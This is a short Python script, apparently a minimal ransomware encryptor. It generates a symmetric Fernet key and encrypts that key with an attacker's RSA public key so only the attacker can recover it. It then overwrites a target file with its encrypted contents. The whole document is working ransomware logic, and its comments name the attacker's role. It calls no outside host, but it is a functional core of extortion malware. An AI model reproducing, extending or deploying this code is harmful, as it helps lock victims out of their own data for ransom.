from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet


# Generation of the symmetric key
symmetricKey = Fernet.generate_key()

FernetInstance = Fernet(symmetricKey)

# Load the attacker's public key from a file, used to encrypt the symmetric key he/she generated.
with open("public_key.key", "rb") as key_file:
	public_key = serialization.load_pem_public_key(
		key_file.read(),
		backend=default_backend()
)

# Encrypt the random symmetric key we created using the attacker's public key.
encryptedSymmetricKey = public_key.encrypt(
	symmetricKey,
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
	)
)

with open("encryptedSymmertricKey.key", "wb") as key_file:
	key_file.write(encryptedSymmetricKey)

# File to encrypt:
filePath = "FileToEncrypt.txt"

with open(filePath, "rb") as file:
	file_data = file.read()
	encrypted_data = FernetInstance.encrypt(file_data)

with open(filePath, "wb") as file:
	file.write(encrypted_data)
quit()
